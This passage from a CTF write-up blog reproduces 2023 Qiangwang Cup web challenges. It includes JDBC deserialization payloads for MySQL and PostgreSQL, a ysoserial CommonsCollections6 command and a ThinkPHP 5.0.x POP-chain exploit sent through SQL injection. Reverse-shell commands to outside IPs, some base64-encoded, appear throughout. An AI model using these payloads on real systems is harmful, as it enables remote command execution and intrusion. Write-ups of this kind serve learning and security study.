跳跳糖</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699186082246-dff3269f-5cf5-4f74-8ccc-970c455b1052.png" alt="img"></p><p>或者用工具生成payload<a href="https://github.com/4ra1n/mysql-fake-server">GitHub - 4ra1n&#x2F;mysql-fake-server: MySQL Fake Server (纯Java实现，支持GUI版和命令行版，提供Dockerfile，支持多种常见JDBC利用)</a></p><p>注意这里选用的CC6的链子 这也就是为什么要给依赖让我们知道是<code>commons-collections-3.2.1</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699190566032-86255c59-cffd-4d1d-a011-01a2973cec93.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span></span><br></pre></td></tr></table></figure><p>这里需要知道</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//ip:port/test</span></span><br></pre></td></tr></table></figure><p>这里的ip port是我们在vps起的恶意MySQL服务 也是用这个工具的cli版本即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699190663630-b94fa85c-45be-411f-b962-e52f1045be1d.png" alt="img"></p><p>除此之外 题目中给的代码是 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DriverManager.getConnection(url, username, password);</span><br></pre></td></tr></table></figure><p>即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖</p><p>所以我们用工具生成的payload中user部分要改为username</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span></span><br></pre></td></tr></table></figure><p>当然这样还是不行</p><p>要将之后的命令执行部分改为适合java的payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span></span><br></pre></td></tr></table></figure><p>至于drive的由来 问了一下GPT 是默认固定的路径</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191288102-7c8a37c4-2f70-4b11-b10c-72b1b6707d10.png" alt="img"></p><p>因此最终payload的为：记得要url编码打入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/testConnection?</span><br><span class="line">driver=com.<span class="property">mysql</span>.<span class="property">cj</span>.<span class="property">jdbc</span>.<span class="property">Driver</span>&amp;url=<span class="attr">jdbc</span>:<span class="attr">mysql</span>:<span class="comment">//8.130.34.53:3308/testConnection?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&amp;password=123</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191420960-8bf11182-5e45-4fa4-8383-5dca1f83430f.png" alt="img"></p><p>连接我们的恶意mysql服务成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191454720-589f9452-830f-42fc-8777-cb0227d236d7.png" alt="img"></p><p>反弹shell成功<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191477892-9a92d92d-961a-427e-bd65-5bf097d37027.png" alt="img"></p><h3 id="解法二-利用-postgresql-驱动"><a href="#解法二-利用-postgresql-驱动" class="headerlink" title="解法二 利用 postgresql 驱动"></a>解法二 利用 postgresql 驱动</h3><p>还是利用那个项目工具</p><p>生成payload<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699193586740-2cb7093a-9f9a-4065-9845-6479c886f899.png" alt="img"></p><p>此时ip和port应该是postgresql的服务而不是mysql</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//ip:port/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=xml文件访问地址</span></span><br></pre></td></tr></table></figure><p>然后xml内容参考<a href="https://xz.aliyun.com/t/11812">PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724) - 先知社区</a></p><p>用http起一个服务 开放这个xml文件访问</p><p>最终payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/testConnection?driver=jdbc:postgresql:<span class="comment">//ip:port/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=xml文件访问地址&amp;username=123&amp;password=123</span></span><br></pre></td></tr></table></figure><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>java还是一窍不通 :(  只能硬着头皮复现了</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023强网杯初赛WEB复现学习</title>
      <link href="/post/c9a1b8ba.html"/>
      <url>/post/c9a1b8ba.html</url>
      
        <content type="html"><![CDATA[<p>2023强网杯初赛WEB复现学习</p><span id="more"></span><h1 id="happygame"><a href="#happygame" class="headerlink" title="happygame"></a>happygame</h1><p>参考<a href="https://literate-maraca-adc.notion.site/PC-1b8573e568b24b3886c6b8519394353f">Notion – The all-in-one workspace for your notes, tasks, wikis, and databases.</a>然后用以下工具连接</p><p>项目地址<a href="https://github.com/fullstorydev/grpcui">GitHub - fullstorydev&#x2F;grpcui: An interactive web UI for gRPC, along the lines of postman</a></p><p>之后是打cc6的反序列化链就行了 恶心的是有时候会莫名其妙报错弹不过来 得多打几次</p><p>用ysoserial生成文件上传即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2LzM2LjE0MC45NS4xMjEvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&gt;payload</span><br></pre></td></tr></table></figure><h1 id="thinkshop"><a href="#thinkshop" class="headerlink" title="thinkshop"></a>thinkshop</h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>首先是给了附件 不是直接给了源码包 需要自己docker本地搭一下 </p><p>根据给的readme搭就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内部端口80，flag为环境变量设置flag</span><br><span class="line">首先需要docker load &lt; thinkshop.tar</span><br><span class="line">docker run -tid --name thinkshop -p 36000:80 -e FLAG=flag&#123;test_flag&#125; thinkshop</span><br></pre></td></tr></table></figure><p>搭建好之后直接来看<code>start.sh</code> 这里有一些初始化的操作</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702906801408-33c301ba-0e03-412c-94b9-751a4de0cff4.png" alt="img"></p><p>查看shop.sql可以发现 账号和密码 密码是123456的md5之后的值</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702906913868-000427f6-1e19-4e3e-9d26-19b2975891c5.png" alt="img"></p><p>这里有个坑就是登录名不是admin而是1 因为find()在这里去找了主键列查询的是id</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702957445255-8bac792d-be33-41c6-86bd-b544da669f13.png" alt="img"></p><p>登录成功之后通过修改商品信息将序列化的数据利用sql注入存入数据库中 然后在商品展示界面会将我们的data部分数据反序列化</p><p>利用点如下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702957636093-3ce0415f-1890-4a94-90bd-fee7ec6f996f.png" alt="img"></p><p>在商品信息更新这里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function do_edit()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!session(&#x27;?admin&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;error(&#x27;请先登录&#x27;,&#x27;index/admin/login&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        $goodsModel = new Goods();</span><br><span class="line">        $data = input(&#x27;post.&#x27;);</span><br><span class="line">        $result = $goodsModel-&gt;saveGoods($data);</span><br><span class="line">        if ($result) &#123;</span><br><span class="line">            $this-&gt;success(&#x27;商品信息更新成功&#x27;, &#x27;index/index/index&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;error(&#x27;商品信息更新失败&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>input函数是一个自定义函数 会接收我们输入值 在这里是<code>$_POST</code>数组 然后会进入Good类中的saveGoods()</p><p>我们跟进</p><p>到save函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702958009453-a1598e89-2930-4682-a99a-13c070f0531d.png" alt="img"></p><p>接着会到Update类中的updatedata()</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702958048311-77ef2525-290f-4d3f-b18a-2e3a722cc710.png" alt="img"></p><p>这里会对我们提交的整个post数组遍历</p><p>并且对<code>$key</code>也就是键 未做任何限制以及过滤 存在sql注入</p><p>注入形式为 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data`%3Dunhex(&#x27;十六进制数据&#x27;)/**/where/**/id%3D1/**/or/**/6%3D6#=1</span><br></pre></td></tr></table></figure><p>这里还存在一个小点就是因为是键这里存在注入点 因此我们的恶意payload要全部放在键的位置</p><p>所以第一个等号要url编码 </p><p>此次之外php中变量中的空格会被当作非法符号会被转为<code>_</code>因此这里需要<code>/**/</code>来替代空格</p><p>报错可以得知是5.0.23的版本</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961512398-e6790213-91f4-4756-b225-d64896ea0645.png" alt="img"></p><p>直接找现成的exp 之后我也会调试过一遍这个链子 我分析过写文件的链子 这个直接rce的反而被我忽略了</p><p><a href="https://www.freebuf.com/vuls/317886.html">ThinkPHP5反序列化利用链总结与分析 - FreeBuf网络安全行业门户</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes&#123;</span><br><span class="line">    use think\model\Pivot;</span><br><span class="line">    ini_set(&#x27;display_errors&#x27;,1);</span><br><span class="line">    class Windows&#123;</span><br><span class="line">        private $files = [];</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files = [new Pivot($function,$parameter)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = array(new Windows(&#x27;system&#x27;,&#x27;cat /*&#x27;));</span><br><span class="line">    echo bin2hex(base64_encode(serialize($a)));</span><br><span class="line">&#125;</span><br><span class="line">namespace think&#123;</span><br><span class="line">    abstract class Model</span><br><span class="line">    &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    use think\Model;</span><br><span class="line">    use think\console\Output;</span><br><span class="line">    class Pivot extends Model</span><br><span class="line">    &#123;</span><br><span class="line">        protected $append = [];</span><br><span class="line">        protected $error;</span><br><span class="line">        public $parent;</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;append[&#x27;jelly&#x27;] = &#x27;getError&#x27;;</span><br><span class="line">            $this-&gt;error = new relation\BelongsTo($function,$parameter);</span><br><span class="line">            $this-&gt;parent = new Output($function,$parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    abstract class Relation</span><br><span class="line">    &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model\relation&#123;</span><br><span class="line">    use think\db\Query;</span><br><span class="line">    use think\model\Relation;</span><br><span class="line">    abstract class OneToOne extends Relation</span><br><span class="line">    &#123;&#125;</span><br><span class="line">    class BelongsTo extends OneToOne</span><br><span class="line">    &#123;</span><br><span class="line">        protected $selfRelation;</span><br><span class="line">        protected $query;</span><br><span class="line">        protected $bindAttr = [];</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;selfRelation = false;</span><br><span class="line">            $this-&gt;query = new Query($function,$parameter);</span><br><span class="line">            $this-&gt;bindAttr = [&#x27;&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\db&#123;</span><br><span class="line">    use think\console\Output;</span><br><span class="line">    class Query</span><br><span class="line">    &#123;</span><br><span class="line">        protected $model;</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;model = new Output($function,$parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\console&#123;</span><br><span class="line">    use think\session\driver\Memcache;</span><br><span class="line">    class Output</span><br><span class="line">    &#123;</span><br><span class="line">        protected $styles = [];</span><br><span class="line">        private $handle;</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">            $this-&gt;handle = new Memcache($function,$parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\session\driver&#123;</span><br><span class="line">    use think\cache\driver\Memcached;</span><br><span class="line">    class Memcache</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler = null;</span><br><span class="line">        protected $config  = [</span><br><span class="line">            &#x27;expire&#x27;       =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;session_name&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        ];</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handler = new Memcached($function,$parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\cache\driver&#123;</span><br><span class="line">    use think\Request;</span><br><span class="line">    class Memcached</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler;</span><br><span class="line">        protected $options = [];</span><br><span class="line">        protected $tag;</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            // pop链中需要prefix存在，否则报错</span><br><span class="line">            $this-&gt;options = [&#x27;prefix&#x27;   =&gt; &#x27;jelly/&#x27;];</span><br><span class="line">            $this-&gt;tag = true;</span><br><span class="line">            $this-&gt;handler = new Request($function,$parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think&#123;</span><br><span class="line">    class Request</span><br><span class="line">    &#123;</span><br><span class="line">        protected $get     = [];</span><br><span class="line">        protected $filter;</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;filter = $function;</span><br><span class="line">            $this-&gt;get = [&quot;jelly&quot;=&gt;$parameter];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还有细节 就是如果我们直接用找到的exp是打不通的 会报错 </p><p>为什么呢</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961662019-a4b3c0b6-334f-409b-a2c9-1720c9c9c90b.png" alt="img"></p><p>我们来看源码在index.php</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961720434-8c0be840-303b-41ce-87bc-1e04f3aafbae.png" alt="img"></p><p>这里会调用getGoodsById()这个函数 通过id将商品信息展示出来 我们跟进</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961787825-08229a75-1038-4aca-8f6d-dddb6dd2deb1.png" alt="img"></p><p>这里存在if语句 只有当我们的序列化前三个字符为YTo时候才能正常返回数据 不然就会报错</p><p>那么如果我们直接用现成的exp得到的payload 是以Yzo开头的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961926210-57776333-6a69-4cbc-a098-378188fc97c9.png" alt="img"></p><p>所以这里相当于是过滤了O开头的序列化数据 因此我们需要用array套一层</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702962000796-d8a07081-ba60-473a-88de-68622e10e85f.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php/index/admin/do_edit.html HTTP/1.1</span><br><span class="line">Host: 8.130.34.53:36000</span><br><span class="line">Content-Length: 3642</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://8.130.34.53:36000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://8.130.34.53:36000/public/index.php/index/admin/goods_edit/id/1.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: lang=zh-CN; PHPSESSID=bd8qvbnd5o75gf8hee58mjc2dl; security=low; session=s%3AwF7W5kbM_l9kvG45vBvcplohNTrNUGDm.rlq4UgfTZE97SVMLHKBWb1E1FKhkK9XSTVSf4RMR5mU; ajs_anonymous_id=16400539-7c9c-4fb2-a5e1-9e30824abd6f; beegosessionID=669d3f25e6e82d40ee79eef74ed5c359</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">id=1&amp;name=fake_flag&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3Dunhex(&#x27;59546f784f6e74704f6a4137547a6f794e7a6f6964476870626d746363484a765932567a633178776158426c633178586157356b6233647a496a6f784f6e747a4f6a4d304f69494164476870626d746363484a765932567a633178776158426c633178586157356b6233647a41475a706247567a496a74684f6a453665326b364d4474504f6a45334f694a3061476c75613178746232526c6246785161585a76644349364d7a7037637a6f354f6949414b6742686348426c626d51694f3245364d547037637a6f314f694a715a57787365534937637a6f344f694a6e5a585246636e4a766369493766584d364f446f6941436f415a584a79623349694f3038364d7a4136496e526f61573572584731765a47567358484a6c624746306157397558454a6c624739755a334e55627949364d7a7037637a6f784e546f6941436f41633256735a6c4a6c6247463061573975496a74694f6a4137637a6f344f6949414b6742786457567965534937547a6f784e446f6964476870626d74635a474a635558566c636e6b694f6a453665334d364f446f6941436f416257396b5a5777694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a7439637a6f794f446f694148526f6157357258474e76626e4e7662475663543356306348563041476868626d52735a534937547a6f794f546f6964476870626d74636332567a63326c76626c786b636d6c325a584a63545756745932466a614755694f6a493665334d364d5441364967417141476868626d52735a5849694f3038364d6a6736496e526f6157357258474e685932686c5847527961585a6c636c784e5a57316a59574e6f5a5751694f6a4d3665334d364d5441364967417141476868626d52735a5849694f3038364d544d36496e526f6157357258464a6c6358566c633351694f6a493665334d364e6a6f6941436f415a325630496a74684f6a453665334d364e546f69616d567362486b694f334d364e6a6f695932463049433871496a7439637a6f354f6949414b67426d615778305a5849694f334d364e6a6f6963336c7a64475674496a7439637a6f784d446f6941436f4162334230615739756379493759546f784f6e747a4f6a5936496e42795a575a7065434937637a6f324f694a715a577873655338694f33317a4f6a593649674171414852685a794937596a6f784f33317a4f6a6b364967417141474e76626d5a705a79493759546f794f6e747a4f6a5936496d563463476c795a534937637a6f774f6949694f334d364d544936496e4e6c63334e7062323566626d46745a534937637a6f774f6949694f3331396658317a4f6a45784f6949414b6742696157356b515852306369493759546f784f6e74704f6a4137637a6f774f6949694f333139637a6f324f694a7759584a6c626e51694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a7439637a6f794f446f694148526f6157357258474e76626e4e7662475663543356306348563041476868626d52735a534937547a6f794f546f6964476870626d74636332567a63326c76626c786b636d6c325a584a63545756745932466a614755694f6a493665334d364d5441364967417141476868626d52735a5849694f3038364d6a6736496e526f6157357258474e685932686c5847527961585a6c636c784e5a57316a59574e6f5a5751694f6a4d3665334d364d5441364967417141476868626d52735a5849694f3038364d544d36496e526f6157357258464a6c6358566c633351694f6a493665334d364e6a6f6941436f415a325630496a74684f6a453665334d364e546f69616d567362486b694f334d364e6a6f695932463049433871496a7439637a6f354f6949414b67426d615778305a5849694f334d364e6a6f6963336c7a64475674496a7439637a6f784d446f6941436f4162334230615739756379493759546f784f6e747a4f6a5936496e42795a575a7065434937637a6f324f694a715a577873655338694f33317a4f6a593649674171414852685a794937596a6f784f33317a4f6a6b364967417141474e76626d5a705a79493759546f794f6e747a4f6a5936496d563463476c795a534937637a6f774f6949694f334d364d544936496e4e6c63334e7062323566626d46745a534937637a6f774f6949694f333139665831396658303d&#x27;)/**/where/**/id%3D1/**/or/**/6%3D6#&amp;data=123%0D%0A</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702962450408-5c2cd26c-a85f-4dbd-bce7-939784dd8d56.png" alt="img"></p><p>成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702962464453-4874790c-8e3d-4dc4-8569-c1ccbf5a5da9.png" alt="img"></p><h2 id="thinkphp5-0-x-RCE反序列链分析"><a href="#thinkphp5-0-x-RCE反序列链分析" class="headerlink" title="thinkphp5.0.x RCE反序列链分析"></a>thinkphp5.0.x RCE反序列链分析</h2><p>那么我们之前是已经分析过直接写shell文件的链子了 <a href="https://z1d10t.fun/post/60ce7176.html#more">Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习</a></p><p> 在这里的链子是直接RCE的</p><p>整个链子我愿称之为是5.0.xshell链子的前半段+5.1.xRCE链子的后半段融合版本</p><p>前面的链子和5.0.x几乎相同 直到来到Memcached.php write()函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971190280-7ec590ae-3529-42d9-bd4d-99bdf3c54be3.png" alt="img"></p><p>5.0.x中我们是调用了File类中的set方法去写shell</p><p>但是这条链子我们还是继续调用本类中的set方法</p><p>我们跟进一下 这里着重关注has()方法 传入的<code>$name</code>是我们可控的变量和<code>&lt;getAttr&gt;xxx&lt;getAttr&gt;</code>拼接的结果</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971298577-f25fd92a-db9a-43ad-b262-eb3dce893ef2.png" alt="img"></p><p>继续跟进接着会调用<code>$this-&gt;handler-&gt;get</code>方法 可以看到此时<code>$this-&gt;handler</code>为Request对象 那么调过5.1.xrce链子的都会很熟悉这个Request类 我们就是利用这个类来RCE</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971524833-f26caae8-de39-468a-b956-a8ce443ca468.png" alt="img"></p><p>跟进到Request中的get方法 传入input函数的$this-&gt;get就是我们输入的get传参</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971703269-e39ca43a-d1e9-4584-8bbd-3e5c53d4b6d2.png" alt="img"></p><p>继续跟进到getFilter这里我们的filter还是空值 那么就是由这个函数帮我们赋值的 并且<code>$this-&gt;filter</code>可控</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702972367586-8be3bc25-e176-4464-b9b5-c663b53a5d65.png" alt="img"></p><p>跟进获取到filter 之后会被当作命令执行函数调用</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702972401359-2ac1eb11-c1f4-47c8-85ec-24e0587b4fb5.png" alt="img"></p><p>最后到了filterValue() 老朋友了 里面存在<code>call_user_func()</code>直接进行命令执行 这么这个链子就算是完成了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702972503070-1c67ca7a-917c-4e46-9a82-709ba0110556.png" alt="img"></p><p>整个调用栈为：</p><figure class="highlight plaintext"><table><tr><td 